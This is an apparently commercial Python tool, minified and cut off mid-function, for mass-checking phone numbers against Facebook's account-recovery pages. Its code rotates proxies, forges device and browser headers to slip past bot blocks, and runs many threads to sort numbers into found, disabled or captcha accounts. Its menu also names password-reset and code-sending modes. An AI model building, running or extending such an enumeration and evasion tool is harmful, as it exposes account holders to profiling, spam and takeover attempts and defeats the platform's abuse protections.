_Ak='Main Proxy'
_Aj='Unknown Page (Device Based) - Skipping...'
_Ai='Unknown Page after try another way - Skipping...'
_Ah='input type="radio" name="recover_method" value="send_sms:.*?".*?checked="1"'
_Ag='/recover/initiate/'
_Af='href="(/recover/initiate/\\?privacy_mutation_token=.*?)"'
_Ae='action="/login/account_recovery/name_search/?flow=initiate_view'
_Ad='Code Sent Failed - Skipping...'
_Ac='action="/recover/code/'
_Ab='initate_view'
_Aa='recover_method'
_AZ='<form.*?action="(.*?)".*?id="contact_point_selector_form"'
_AY='".*?<div class="_52jc _52j9">(.*?)</div>'
_AX='label for="'
_AW='input type="radio" name="recover_method" value="(send_sms:.*?)".*?id="(.*?)"'
_AV='name="recover_method"'
_AU='/login/account_recovery/'
_AT='name="pass"'
_AS='same-origin'
_AR='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8'
_AQ='upgrade-insecure-requests'
_AP='sec-fetch-mode'
_AO='Mi Browser'
_AN='DuckDuckGo'
_AM='Farhad Tools'
_AL='Continue'
_AK='reset_action'
_AJ='proxy_settings'
_AI='/login.php?next='
_AH='Bot Block - Skipping...'
_AG='window.MPageLoadClientMetrics'
_AF='class="area error"'
_AE='Account Disabled - Skipping...'
_AD='/help/103873106370583'
_AC='/help/121104481304395'
_AB='Multiple Account Found - Skipping...'
_AA='action="/login/identify/?ctx=recover'
_A9='id="login_identify_search_error_msg"'
_A8='Search'
_A7='did_submit'
_A6='email'
_A5='"initSprinkleValue":"(.*?)"'
_A4='\\["LSD",\\[\\],\\{"token":"(.*?)"\\}'
_A3='document'
_A2='sec-fetch-dest'
_A1='accept'
_A0='https://t.me/farhad80715'
_z='iPhone'
_y='limited.facebook.com'
_x='facebook_login'
_w='/login/'
_v='ars'
_u='&amp;'
_t='id="contact_point_selector_form"'
_s='Unknown Page - Skipping...'
_r='/r.php?next='
_q='Captcha Found - Skipping...'
_p='name="captcha_response"'
_o='Account Not Found'
_n='wd'
_m='m_pixel_ratio'
_l='Random'
_k='ignore'
_j='\r                                                                                \r'
_i='\n'
_h=False
_g='max-age=0'
_f='origin'
_e='cache-control'
_d='sec-fetch-site'
_c='Opera'
_b='Firefox'
_a='Edge'
_Z='Brave'
_Y='success'
_X="Your Request Couldn't be Processed"
_W='application/x-www-form-urlencoded'
_V='content-type'
_U='Chrome'
_T='Unknown'
_S='jazoest'
_R='lsd'
_Q='locale'
_P='en_US'
_O='name="jazoest" value="(.*?)"'
_N='name="lsd" value="(.*?)"'
_M='proxy'
_L='1'
_K='countryCode'
_J='utf-8'
_I='ar_AR'
_H='Farhad Forget'
_G='country'
_F='referer'
_E='Farhad Confirm'
_D='error'
_C='failed'
_B=None
_A=True
import os,random,re,sys,time,webbrowser,json,threading,requests,openpyxl
from concurrent.futures import ThreadPoolExecutor,as_completed
import ssl,socket,base64
from datetime import datetime,timezone
import hashlib,itertools,uuid,subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
if sys.platform=='linux':os.system('')
WHITE='\x1b[1;97m'
GREEN='\x1b[1;92m'
RED='\x1b[1;91m'
DARK_GREEN='\x1b[1;32m'
LIGHT_GRAY='\x1b[1;37m'
CYAN='\x1b[1;96m'
YELLOW='\x1b[1;93m'
BLUE='\x1b[1;94m'
MAGENTA='\x1b[1;95m'
ORANGE='\x1b[38;5;208m'
GOLD='\x1b[38;5;220m'
VIOLET='\x1b[38;5;141m'
TOXIC='\x1b[38;2;170;200;0m'
PURPLE='\x1b[38;2;150;80;200m'
RESET='\x1b[0m'
EKL=f"{CYAN}:{WHITE}"
LINE=f"{CYAN}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
SERVER_URL='https://farhad80715.pythonanywhere.com'
SERVER_MAP={1:'m.facebook.com',2:'mbasic.facebook.com',3:'touch.facebook.com',4:'free.facebook.com',5:_y}
DEVICE_MAP={1:'Android',2:_z,3:'KaiOS',4:'Windows Phone',5:'BlackBerry'}
print_lock=threading.Lock()
counter_lock=threading.Lock()
total_checked=0
total_success=0
total_failed=0
total_error=0
CURRENT_LOCALE=_P
SAVE_ERROR_LOGS='off'
user_nm=_T
expr=_T
SELECTED_SERVER=_y
SELECTED_DEVICE=_z
SELECTED_BROWSER=_U
settings={}
found_numbers=[]
SECRET_KEY=b'LHANKLRTOLUMCDCK'
SECRET_KEY2=b'GTRMAREAMLXUDWDJ'
def get_mobile_device_id():
	'Termux e Android device ID generate kore';B='getprop'
	try:
		A=subprocess.run(['settings','get','secure','android_id'],capture_output=_A,text=_A)
		if A.stdout.strip():return hashlib.md5(A.stdout.strip().encode()).hexdigest()[:32]
	except:pass
	try:
		A=subprocess.run([B,'ro.serialno'],capture_output=_A,text=_A)
		if A.stdout.strip()and A.stdout.strip()!='unknown':return hashlib.md5(A.stdout.strip().encode()).hexdigest()[:32]
	except:pass
	try:
		A=subprocess.run([B,'ro.build.fingerprint'],capture_output=_A,text=_A)
		if A.stdout.strip():return hashlib.md5(A.stdout.strip().encode()).hexdigest()[:32]
	except:pass
	C=str(uuid.getnode())+str(int(time.time()))+os.path.expanduser('~');return hashlib.md5(C.encode()).hexdigest()[:32]
def check_approval():
	global user_nm,expr
	try:
		A=get_mobile_device_id();C=requests.get(f"{SERVER_URL}/apv",timeout=10)
		if C.status_code==200:
			D=C.json()
			for B in D:
				if B['Device_ID']==A:
					user_nm=B['User_Name'];expr=B['End_date'];E=datetime.now(timezone.utc);F=datetime.strptime(expr,'%Y-%m-%d %H:%M').replace(tzinfo=timezone.utc)
					if E>=F:clear_logo();print(f"\n{LINE}");print(f"{RED}  YOUR ACCESS HAS EXPIRED!{RESET}");print(f"{LINE}");print(f"{WHITE}  Device ID  : {GREEN}{A}{RESET}");print(f"{WHITE}  User Name  : {GREEN}{user_nm}{RESET}");print(f"{WHITE}  Expired on : {RED}{expr} (UTC){RESET}");print(f"{LINE}\n");input(f"{WHITE}  Press Enter to contact owner...{RESET}");webbrowser.open(_A0);sys.exit(0)
					return _A
			clear_logo();print(f"\n{LINE}");print(f"{RED}  DEVICE NOT REGISTERED!{RESET}");print(f"{LINE}");print(f"{WHITE}  Device ID : {YELLOW}{A}{RESET}");print(f"{WHITE}  Your Device ID is not registered.{RESET}");print(f"{WHITE}  Please contact owner to get access.{RESET}");print(f"{LINE}\n");input(f"{WHITE}  Press Enter to contact owner...{RESET}");webbrowser.open(_A0);sys.exit(0)
		else:clear_logo();print(f"\n{LINE}");print(f"{RED}  SERVER CONNECTION FAILED!{RESET}");print(f"{LINE}");print(f"{WHITE}  Please check your internet connection.{RESET}");print(f"{WHITE}  Server URL: {CYAN}{SERVER_URL}{RESET}");print(f"{LINE}\n");input(f"{WHITE}  Press Enter to exit...{RESET}");sys.exit(0)
	except requests.exceptions.ConnectionError:clear_logo();print(f"\n{LINE}");print(f"{RED}  SERVER OFFLINE!{RESET}");print(f"{LINE}");print(f"{WHITE}  Cannot connect to approval server.{RESET}");print(f"{WHITE}  Server URL: {CYAN}{SERVER_URL}{RESET}");print(f"{LINE}\n");input(f"{WHITE}  Press Enter to exit...{RESET}");sys.exit(0)
	except Exception as G:clear_logo();print(f"\n{LINE}");print(f"{RED}  APPROVAL ERROR!{RESET}");print(f"{LINE}");print(f"{WHITE}  Error: {RED}{G}{RESET}");print(f"{LINE}\n");input(f"{WHITE}  Press Enter to exit...{RESET}");sys.exit(0)
def dec_rq(sxrreqq):A=base64.urlsafe_b64decode(sxrreqq.encode(_J));B=AES.new(SECRET_KEY,AES.MODE_ECB);C=unpad(B.decrypt(A),AES.block_size).decode(_J);D=json.loads(C);return D
def dec_rq2(keyid):A=base64.urlsafe_b64decode(keyid.encode(_J));B=AES.new(SECRET_KEY2,AES.MODE_ECB);C=unpad(B.decrypt(A),AES.block_size).decode(_J);return C
def parse_proxy(proxy_str):
	C=proxy_str
	if'://'not in C:
		A=C.split(':')
		if len(A)==4:D,E,F,G=A;B=f"http://{F}:{G}@{D}:{E}"
		elif len(A)==2:D,E=A;B=f"http://{D}:{E}"
		else:return
	else:B=C
	return{'http':B,'https':B}
def test_proxy(proxies,server_domain):
	try:A=requests.get(f"https://{server_domain}",proxies=proxies,timeout=10);return A.status_code==200
	except:return _h
COUNTRY_TO_LOCALE={'BD':'bn_IN','IN':'hi_IN','US':_P,'GB':'en_GB','PK':'ur_PK','AE':_I,'SA':_I,'EG':_I,'IQ':_I,'JO':_I,'KW':_I,'LB':_I,'LY':_I,'MA':_I,'OM':_I,'QA':_I,'SD':_I,'SY':_I,'TN':_I,'YE':_I}
def get_locale_code(country_code):return COUNTRY_TO_LOCALE.get(country_code.upper(),_P)
def get_ip_info(proxies=_B):
	B='timezone'
	try:
		C=requests.get('http://ip-api.com/json/',proxies=proxies,timeout=10)
		if C.status_code==200:A=C.json();return{_G:A.get(_G,_T),_K:A.get(_K,'US'),B:A.get(B,_T)}
	except:pass
	return{_G:_T,_K:'US',B:_T}
def load_settings():
	try:
		with open('Setting.json','r')as A:return json.load(A)
	except:return{}
def save_output(filename,data):
	A='Outputs'
	if not os.path.exists(A):os.makedirs(A)
	B=f"Outputs/{filename}"
	try:
		with open(B,'a',encoding=_J)as C:C.write(data+_i)
	except Exception as D:safe_print(f"{RED} Failed to save output: {D}")
def save_error_html(message,html_content):
	D='Error_Logs';B=message
	if SAVE_ERROR_LOGS.lower()!='on':return
	try:
		if not os.path.exists(D):os.makedirs(D)
		A=re.sub('[\\\\/*?:"<>|]','',B);A=A.replace(' ','_')[:50];E=f"Error_Logs/{A}.html"
		with open(E,'w',encoding=_J)as C:C.write(f"<!-- Error: {B} -->\n");C.write(html_content)
	except Exception as F:safe_print(f"{RED} Failed to save error log: {F}")
def save_unknown_page(number,source,html_content):
	A='Unknown_Page_Logs'
	if not os.path.exists(A):os.makedirs(A)
	B=int(time.time());C=f"Unknown_Page_Logs/{number}_{source}_{B}.html"
	try:
		with open(C,'w',encoding=_J)as D:D.write(html_content)
	except Exception as E:safe_print(f"{RED} Failed to save unknown page log: {E}")
def get_status_line(tool_name=_AM):return f"\r{GREEN}[{WHITE}{tool_name}{GREEN}] {WHITE}CHECKED:-{total_checked}{CYAN}|{GREEN}SUCCESS:-{total_success}{CYAN}|{YELLOW}FAILED:-{total_failed}{CYAN}|{RED}ERROR:-{total_error}"
def safe_print(text):
	with print_lock:
		sys.stdout.write(_j)
		try:sys.stdout.write(str(text)+_i)
		except UnicodeEncodeError:sys.stdout.write(str(text).encode(_J,_k).decode(_J)+_i)
		sys.stdout.flush()
def update_counter(status,number=_B,message=_B,color=_B,html_content=_B,otp=_B,tool_name=_AM):
	E=html_content;D=status;C=number;B=color;A=message;global total_success,total_failed,total_error,total_checked,found_numbers
	with counter_lock:
		if D==_Y:
			total_success+=1
			if C:found_numbers.append(C)
		elif D==_C:total_failed+=1
		elif D==_D:
			total_error+=1
			if E:save_error_html(A if A else'Unknown Error',E)
		total_checked+=1
	if A and C:
		if not B:B=WHITE
		safe_print(f"{B} {A} {C}")
	elif A:
		if not B:B=WHITE
		safe_print(f"{B} {A}")
	else:
		with print_lock:sys.stdout.write(get_status_line(tool_name));sys.stdout.flush()
def reset_counters():global total_checked,total_success,total_failed,total_error,found_numbers;total_checked=0;total_success=0;total_failed=0;total_error=0;found_numbers=[]
def clear_logo():os.system('clear');A=f"""
{GREEN}
███████╗ █████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗ 
██╔════╝██╔══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
█████╗  ███████║██████╔╝███████║███████║██║  ██║
██╔══╝  ██╔══██║██╔══██╗██╔══██║██╔══██║██║  ██║
██║     ██║  ██║██║  ██║██║  ██║██║  ██║██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═════╝ 

████████╗ ██████╗  ██████╗ ██╗     ███████╗
╚══██╔══╝██╔═══██╗██╔═══██╗██║     ██╔════╝
   ██║   ██║   ██║██║   ██║██║     ███████╗
   ██║   ██║   ██║██║   ██║██║     ╚════██║
   ██║   ╚██████╔╝╚██████╔╝███████╗███████║
   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝╚══════╝
{LINE}
 {GREEN}[{RED}●{GREEN}] TOOL OWNER   {CYAN}:{GREEN} FARHAD AHMED
 {GREEN}[{RED}●{GREEN}] TOOL         {CYAN}:{GREEN} FACEBOOK
 {GREEN}[{RED}●{GREEN}] TOOL STATUS  {CYAN}:{GREEN} PAID
 {GREEN}[{RED}●{GREEN}] USER NAME    {CYAN}:{GREEN} {user_nm}
 {GREEN}[{RED}●{GREEN}] EXPIRY DATE  {CYAN}:{GREEN} {expr}
{LINE}""";print(A)
def display_menu():print(f"\n{WHITE}Welcome to Farhad FB Tool!{RESET}");print(LINE);print(f" {GREEN}[{RED}01{GREEN}] {WHITE}FB FORGET{RESET}");print(f" {GREEN}[{RED}02{GREEN}] {WHITE}FB FILTER{RESET}");print(f" {GREEN}[{RED}03{GREEN}] {WHITE}FB CONFIRM{RESET}");print(f" {GREEN}[{RED}04{GREEN}] {WHITE}JOIN TELEGRAM{RESET}");print(f" {GREEN}[{RED}05{GREEN}] {WHITE}EXIT{RESET}");print(LINE)
def get_browser_headers(browser_type,locale=_P):
	N='"Brave";v="120", "Chromium";v="120", "Not A(Brand";v="24"';I='"Android"';H='sec-ch-ua-platform';G='sec-ch-ua-mobile';F='sec-ch-ua';D=browser_type;C='?1';J=random.choice(['4.0.3','4.0.4','4.1.2','4.2.2','4.3','4.4.2','4.4.4','5.0','5.0.2','5.1.1','6.0','6.0.1','7.0','7.1.1','8.0','8.1','9','10','11','12','13']);O=['SM-G900F','SM-G920F','SM-G930F','SM-G935F','SM-J320F','SM-J500F','SM-J700F','SM-A300FU','SM-A500FU','SM-N910F','SM-N920C','LG-H815','LG-H850','LG-D855','LG-K420','XT1068','XT1092','XT1562','XT1635','E6653','F5121','D6603','ALE-L21','VNS-L31','PRA-LX1','Mi 9T','Redmi Note 8','Poco F1'];L=random.choice(O)
	if J.startswith('4'):K=random.choice(['KOT49','KTU84','JZO54','JSS15'])
	elif J.startswith('5'):K=random.choice(['LRX21','LMY47','LRX22'])
	elif J.startswith('6'):K=random.choice(['MRA58','MMB29'])
	elif J.startswith('7'):K=random.choice(['NRD90','NMF26'])
	elif J.startswith('8'):K=random.choice(['OPR6','OPM1','OPM2'])
	elif J.startswith('9'):K=random.choice(['PQ3A','PKQ1'])
	elif J.startswith('10'):K=random.choice(['QQ3A','QP1A'])
	else:K=random.choice(['RQ2A','RQ3A','SP1A'])
	P=f"{K}{random.choice('ABCDEFGHJKLMNPQRSTUVWXYZ')}{random.randint(35,65)}";Q=f"{random.randint(80,120)}.0.{random.randint(2000,6000)}.{random.randint(100,300)}";E=f"Mozilla/5.0 (Linux; Android {J}; {L} Build/{P}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{Q} Mobile Safari/537.36";A={}
	if D==_Z:B=E;A={F:N,G:C,H:I}
	elif D==_U:B=E;A={F:'"Google Chrome";v="120", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D==_a:B=f"{E} EdgA/120.0.0.0";A={F:'"Microsoft Edge";v="120", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D==_b:M=random.randint(100,120);B=f"Mozilla/5.0 (Android {J}; Mobile; rv:{M}.0) Gecko/{M}.0 Firefox/{M}.0"
	elif D=='Samsung':B=f"{E} SamsungBrowser/22.0";A={F:'"Samsung Internet";v="22", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D==_c:B=f"{E} OPR/80.0.2254.12345";A={F:'"Opera";v="80", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='UC':B=f"{E} UBrowser/13.4.0.1306";A={F:'"UC Browser";v="13", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D==_AN:B=f"{E} DuckDuckGo/5";A={F:'"DuckDuckGo";v="5", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='Vivaldi':B=f"{E} Vivaldi/6.0";A={F:'"Vivaldi";v="6", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='Yandex':B=f"{E} YaBrowser/23.0";A={F:'"Yandex";v="23", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='Kiwi':B=f"{E} Kiwi/124.0.6367.113";A={F:'"Kiwi";v="124", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='Dolphin':B=f"{E} Dolphin/12.3.0";A={F:'"Dolphin";v="12", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D==_AO:B=f"{E} MiuiBrowser/14.0.5";A={F:'"Mi Browser";v="14", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='Maxthon':B=f"{E} Maxthon/7.0.2.1400";A={F:'"Maxthon";v="7", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	elif D=='Puffin':B=f"{E} Puffin/9.10.0.51959";A={F:'"Puffin";v="9", "Chromium";v="120", "Not A(Brand";v="24"',G:C,H:I}
	else:B=E;A={F:N,G:C,H:I}
	R=random.choice(['320x480','480x800','540x960','800x480','854x480','960x540','720x1280','1280x720','1080x1920','1920x1080','1440x2560','2400x1080']);A.update({_A1:_AR,'accept-language':f"{locale},en;q=0.9",'priority':'u=0, i','sec-ch-ua-full-version-list':'"Chromium";v="120.0.0.0", "Not A(Brand";v="24.0.0.0"','sec-ch-ua-model':f'"{L}"','sec-ch-ua-platform-version':f'"{J}"',_A2:_A3,_AP:'navigate',_d:_AS,'sec-fetch-user':C,'sec-gpc':_L,_AQ:_L,'user-agent':B});return A,R,J,L
def select_server():
	global SELECTED_SERVER;clear_logo();print(f"\n {GREEN}SERVER SELECT:\n{LINE}");print(f" {GREEN}[{RED}01{GREEN}] m.facebook.com");print(f" {GREEN}[{RED}02{GREEN}] mbasic.facebook.com");print(f" {GREEN}[{RED}03{GREEN}] touch.facebook.com");print(f" {GREEN}[{RED}04{GREEN}] free.facebook.com");print(f" {GREEN}[{RED}05{GREEN}] limited.facebook.com");print(LINE)
	while _A:
		try:
			A=input(f"\n{GREEN} [{RED}●{GREEN}] Select Server (1-5) [Enter for limited.facebook.com] {EKL} ").strip()
			if A=='':SELECTED_SERVER=_y;print(f"\n{GREEN} [{RED}●{GREEN}] Selected Server {EKL} {SELECTED_SERVER}");time.sleep(1);break
			elif A in[_L,'2','3','4','5']:SELECTED_SERVER=SERVER_MAP[int(A)];print(f"\n{GREEN} [{RED}●{GREEN}] Selected Server {EKL} {SELECTED_SERVER}");time.sleep(1);break
			else:print(f"{RED} Invalid selection! Please enter 1-5 or press Enter")
		except:print(f"{RED} Invalid input!")
def select_device():
	global SELECTED_DEVICE;clear_logo();print(f"\n {GREEN}DEVICE SELECT:\n{LINE}");print(f" {GREEN}[{RED}01{GREEN}] Android    {GREEN}[{RED}02{GREEN}] iPhone (Default)");print(f" {GREEN}[{RED}03{GREEN}] KaiOS      {GREEN}[{RED}04{GREEN}] Windows Phone");print(f" {GREEN}[{RED}05{GREEN}] BlackBerry\n{LINE}")
	while _A:
		try:
			A=input(f"\n{GREEN} [{RED}●{GREEN}] Select Device [Enter for iPhone] {EKL} ").strip().zfill(2)
			if A=='00'or A=='':SELECTED_DEVICE=_z;print(f"\n{GREEN} [{RED}●{GREEN}] Selected Device {EKL} {SELECTED_DEVICE}");time.sleep(1);break
			elif A in['01','02','03','04','05']:SELECTED_DEVICE=DEVICE_MAP[int(A)];print(f"\n{GREEN} [{RED}●{GREEN}] Selected Device {EKL} {SELECTED_DEVICE}");time.sleep(1);break
			else:print(f"{RED} Invalid selection! Please enter 1-5 or press Enter for iPhone")
		except:print(f"{RED} Invalid input!")
def select_browser():
	global SELECTED_BROWSER;clear_logo();print(f"\n {GREEN}BROWSER SELECT:\n{LINE}");print(f" {GREEN}[{RED}01{GREEN}] Chrome");print(f" {GREEN}[{RED}02{GREEN}] Firefox");print(f" {GREEN}[{RED}03{GREEN}] Opera");print(f" {GREEN}[{RED}04{GREEN}] Edge");print(f" {GREEN}[{RED}05{GREEN}] Brave");print(f" {GREEN}[{RED}06{GREEN}] Samsung");print(f" {GREEN}[{RED}07{GREEN}] UC Browser");print(f" {GREEN}[{RED}08{GREEN}] DuckDuckGo");print(f" {GREEN}[{RED}09{GREEN}] Vivaldi");print(f" {GREEN}[{RED}10{GREEN}] Yandex");print(f" {GREEN}[{RED}11{GREEN}] Kiwi");print(f" {GREEN}[{RED}12{GREEN}] Dolphin");print(f" {GREEN}[{RED}13{GREEN}] Mi Browser");print(f" {GREEN}[{RED}14{GREEN}] Maxthon");print(f" {GREEN}[{RED}15{GREEN}] Puffin");print(f" {GREEN}[{RED}00{GREEN}] Random (Mix)\n{LINE}");A={'01':_U,'02':_b,'03':_c,'04':_a,'05':_Z,'06':'Samsung','07':'UC','08':_AN,'09':'Vivaldi','10':'Yandex','11':'Kiwi','12':'Dolphin','13':_AO,'14':'Maxthon','15':'Puffin','00':_l}
	while _A:
		try:
			B=input(f"\n{GREEN} [{RED}●{GREEN}] Select Browser {EKL} ").strip().zfill(2)
			if B in A:SELECTED_BROWSER=A[B];print(f"\n{GREEN} [{RED}●{GREEN}] Selected Browser {EKL} {SELECTED_BROWSER}");time.sleep(1);break
			else:print(f"{RED} Invalid selection! Please enter 00-15")
		except:print(f"{RED} Invalid input!")
def get_proxy_list(settings_key,prompt_label,server_domain):
	H=server_domain;A=prompt_label;Q=load_settings();K=Q.get(settings_key,{});L=K.get('ask_for_proxy',_A);G=K.get('default_proxy','');I=L;F=[]
	if G:
		if isinstance(G,list):
			print(f"{WHITE} Testing {len(G)} Default {A}...")
			for M in G:
				D=parse_proxy(M)
				if D and test_proxy(D,H):B=get_ip_info(D);C=get_locale_code(B[_K]);F.append({_M:D,_Q:C,_G:B[_G]});print(f"{GREEN} [{RED}●{GREEN}] {A} Location {EKL} {B[_G]}");print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {C}")
				else:print(f"{RED} Default {A} Connection Failed: {M}")
		else:
			E=parse_proxy(G)
			if E:
				print(f"{WHITE} Testing Default {A}...")
				if test_proxy(E,H):B=get_ip_info(E);C=get_locale_code(B[_K]);F.append({_M:E,_Q:C,_G:B[_G]});print(f"{GREEN} [{RED}●{GREEN}] {A} Location {EKL} {B[_G]}");print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {C}")
				else:print(f"{RED} Default {A} Connection Failed!")
			else:print(f"{RED} Invalid Default {A} Format!")
		if G and not F:print(f"{RED} All Default {A} Failed!");I=_A
	if F and L:I=_h
	if I:
		while _A:
			try:
				J=input(f"{GREEN} [{RED}●{GREEN}] Enter {A} (or 'y' for multiple) [Press Enter to Skip] {EKL} ").strip()
				if not J:print(f"{YELLOW} No proxy entered, skipping proxy configuration...");break
				if J.lower()=='y':
					N=input(f"{GREEN} [{RED}●{GREEN}] How many {A}? {EKL} ")
					if N.strip():
						O=int(N)
						for R in range(O):
							P=input(f"{WHITE} [{RED}●{WHITE}] Enter {A} [{R+1}/{O}] {EKL} ").strip()
							if P:
								print(f"{WHITE} Testing {A}...");D=parse_proxy(P)
								if D and test_proxy(D,H):B=get_ip_info(D);C=get_locale_code(B[_K]);print(f"{GREEN} [{RED}●{GREEN}] {A} Location {EKL} {B[_G]}");print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {C}");F.append({_M:D,_Q:C,_G:B[_G]})
								else:print(f"{RED} Connection Failed or Invalid Format!")
						break
					else:print(f"{RED} Invalid Number!");break
				if J:
					E=parse_proxy(J)
					if E:
						print(f"{WHITE} Testing {A}...")
						if test_proxy(E,H):B=get_ip_info(E);C=get_locale_code(B[_K]);print(f"{GREEN} [{RED}●{GREEN}] {A} Location {EKL} {B[_G]}");print(f"{GREEN} [{RED}●{GREEN}] Locale      {EKL} {C}");F.append({_M:E,_Q:C,_G:B[_G]});break
						else:print(f"{RED} {A} Connection Failed!")
					else:print(f"{RED} Invalid {A} Format!")
				if F or not I:break
			except:print(f"{RED} Invalid Input")
	return F
def check_filter(number,proxy=_B,locale=_P,retry_count=0):
	F=locale;E=proxy;D=retry_count;C='Farhad Filter';A=number;G=requests.Session();G.timeout=30
	if E:G.proxies.update(E)
	N=SELECTED_BROWSER if SELECTED_BROWSER!=_l else random.choice([_U,_b,_c,_a,_Z]);K,O,S,T=get_browser_headers(N,F);G.cookies.update({_m:_L,_n:O})
	try:
		L=K.copy();L.update({_d:'none'})
		if D==0:safe_print(f"{LIGHT_GRAY} Checking {A}...")
		H=G.get(f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0&__mmr=1&_rdr",headers=L,timeout=30)
		try:I=re.search(_N,str(H.text)).group(1)
		except:
			try:I=re.search(_A4,str(H.text)).group(1)
			except:I=''
		try:J=re.search(_O,str(H.text)).group(1)
		except:
			try:J=re.search(_A5,str(H.text)).group(1)
			except:J=''
		P={_R:I,_S:J,_A6:A,_A7:_A8};M=K.copy();M.update({_e:_g,_V:_W,_f:f"https://{SELECTED_SERVER}",_F:f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0"});Q=f"https://{SELECTED_SERVER}/login/identify/?ctx=recover&c=%2Flogin%2F&search_attempts=1&ars=facebook_login&alternate_search=0&show_friend_search_filtered_list=0&birth_month_search=0&city_search=0";B=G.post(Q,data=P,headers=M,allow_redirects=_A,timeout=30)
		if _A9 in B.text:update_counter(_C,A,_o,MAGENTA,tool_name=C);return
		if _AA in B.text:update_counter(_C,A,_AB,GOLD,tool_name=C);return
		if B.url.startswith(f"https://{SELECTED_SERVER}/login/account_recovery/name_search/")or B.url.startswith(f"https://{SELECTED_SERVER}/login/device-based/ar/login/")or'action="/recover/initiate/'in B.text:update_counter(_Y,A,'Account Found',GREEN,tool_name=C);return
		if _AT in B.text and _AU in B.text:update_counter(_Y,A,'Account Found (Password Recovery)',GREEN,tool_name=C);return
		if _p in B.text:update_counter(_C,A,_q,PURPLE,tool_name=C);return
		if _AC in B.text or _AD in B.text:update_counter(_C,A,_AE,TOXIC,tool_name=C);return
		if _AF in B.text:
			if D<3:check_filter(A,E,F,D+1);return
			update_counter(_D,A,'Error Page - Skipping...',ORANGE,html_content=B.text,tool_name=C);return
		if _AG in B.text:
			if D<3:check_filter(A,E,F,D+1);return
			update_counter(_D,A,_AH,RED,html_content=B.text,tool_name=C);return
		if _r in B.text or _AI in B.text:update_counter(_C,A,_o,MAGENTA,tool_name=C);return
		if _X in B.text:update_counter(_D,A,_X,RED,html_content=B.text,tool_name=C);return
		update_counter(_D,A,_s,ORANGE,html_content=B.text,tool_name=C)
	except(requests.exceptions.ConnectionError,requests.exceptions.Timeout,requests.exceptions.ChunkedEncodingError)as R:
		if D<3:time.sleep(2);check_filter(A,E,F,D+1);return
		update_counter(_D,A,f"Network Error - Skipping...",RED,tool_name=C)
	except Exception as R:
		if D<3:check_filter(A,E,F,D+1);return
		update_counter(_D,A,f"Error - Skipping...",RED,tool_name=C)
def run_filter():
	global SELECTED_SERVER,SELECTED_DEVICE,SELECTED_BROWSER,CURRENT_LOCALE;clear_logo();print(f"\n {WHITE}FB ACCOUNT FILTER TOOL\n{LINE}");C=input(f"\n{GREEN} [{RED}●{GREEN}] Enter file path (TXT or Excel .xlsx) {EKL} ").strip();C=C.strip('"').strip("'")
	if not os.path.exists(C):print(f"{RED} File not found! Use /sdcard/Download/filename.txt for internal storage");input(f"{WHITE} Press Enter to return...");return
	A=[];J=os.path.splitext(C)[1].lower()
	try:
		if J=='.txt':
			with open(C,'r',encoding=_J,errors=_k)as G:A=[A.strip()for A in G if A.strip()]
		elif J in['.xlsx','.xls']:
			K=openpyxl.load_workbook(C,data_only=_A);R=K.active
			for S in R.iter_rows(values_only=_A):
				for L in S:
					if L is not _B:
						D=str(L).strip()
						if D and(D.isdigit()or D.startswith('+')and D[1:].isdigit()):A.append(D)
			K.close()
		else:print(f"{RED} Unsupported file format!");input(f"{WHITE} Press Enter to return...");return
	except Exception as H:print(f"{RED} Error reading file: {H}");input(f"{WHITE} Press Enter to return...");return
	if not A:print(f"{RED} No valid numbers found!");input(f"{WHITE} Press Enter to return...");return
	A=list(dict.fromkeys(A));print(f"\n{GREEN} [{RED}●{GREEN}] Loaded {YELLOW}{len(A)}{GREEN} numbers");time.sleep(1);select_server();select_device();select_browser();clear_logo();print(f"\n {GREEN}SELECTED CONFIGURATION:\n{LINE}");print(f" {GREEN}[{RED}●{GREEN}] Server  {EKL} {SELECTED_SERVER}");print(f" {GREEN}[{RED}●{GREEN}] Device  {EKL} {SELECTED_DEVICE}");print(f" {GREEN}[{RED}●{GREEN}] Browser {EKL} {SELECTED_BROWSER}");print(LINE);E=get_proxy_list(_AJ,'Proxy',SELECTED_SERVER);M=itertools.cycle(E)if E else _B
	if E:print(f"{GREEN} [{RED}●{GREEN}] Total Proxies {EKL} {len(E)}")
	else:N=get_ip_info(_B);CURRENT_LOCALE=get_locale_code(N[_K]);print(f"{GREEN} [{RED}●{GREEN}] Direct Connection {EKL} {N[_G]}")
	try:
		O=input(f"\n{GREEN} [{RED}●{GREEN}] Enter number of Threads (Default: 30) {EKL} ").strip();B=int(O)if O else 30
		if B<1:B=30
		if B>200:B=150
	except:B=30
	clear_logo();reset_counters();print(f"{GREEN} [{RED}●{GREEN}] Total Numbers {EKL} {len(A)}");print(f"{GREEN} [{RED}●{GREEN}] Threads      {EKL} {B}");print(f"{LINE}\n")
	with ThreadPoolExecutor(max_workers=B)as T:
		P=[]
